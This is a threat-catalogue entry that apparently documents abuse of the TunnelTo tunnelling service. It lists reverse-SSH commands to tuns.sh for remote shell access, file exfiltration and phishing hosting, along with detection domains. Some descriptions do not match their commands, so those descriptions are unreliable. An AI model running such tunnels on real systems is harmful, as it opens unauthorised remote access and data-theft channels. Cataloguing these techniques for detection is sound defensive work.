---
Name: TunnelTo
Description: TunnelTo is free/subscription based tool which enables local services/applications to be exposed over the internet. Insiders as well as threat actors can use this tool to perform variety of malicious tasks. Although, the tool requires an authentication token of which free token can be obtained from the website. 
Author: Kamran Saifullah
Created: 2024-10-14
Commands:
  - Command: tunnelto set-auth --key <AUTH KEY>
    Description: In order to install the TunnelTo, it can be done directly via cargo, brew etc. as well as downloadable binaries are provided that can be executed on the fly. 
    Usecase: Installing/Downloading the tunnelto binaries to be executed on the local machine.
    Category: install
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: ssh -R 2222:localhost:22 tuns.sh
    Description: Exeuting the binary to generate a local tunnel by binding it to the local service running on TCP ports. 
    Usecase: Exposing SSH/RDP etc over tunnels for shell-access
    Category: shell-access
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: ssh -R 80:localhost:8080 tuns.sh
    Description: Executing the binary to generate a local tunnel by binding it to a local web server running on port 80.
    Usecase: Exposing the local system over the tunnels for the files to be exfiltrated out of the organization.
    Category: download
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: ssh -R 80:localhost:8080 tuns.sh
    Description: Executing the binary to generate a local tunnel by binding it to the local file system exposed over port 80.
    Usecase: Exposing the local web server/file system over the tunnels for the files to be exfiltrated out of the organization.
    Category: exfiltrate
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: ssh -R 80:localhost:8080 tuns.sh
    Description: Executing the binary to generate a local tunnel by binding it to the local web server hosting phishing sites.
    Usecase: Exposing the local web server hosting phishing sites to target users.
    Category: phishing
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

Full_Path:
  - Path: Downloaded/Installed version of TunnelTo, which gets executed anywhere on the system.
Detection:
  - Domain: '*.tuns.sh'
  - Domain: '*.ssi.sh'
  - Command: Execution of installed/downloaded binary.
Resources:
  - Link: https://docs.ssi.sh/
Acknowledgement:
  - Person: Kamran Saifullah
    Handle: '@deFr0ggy'
---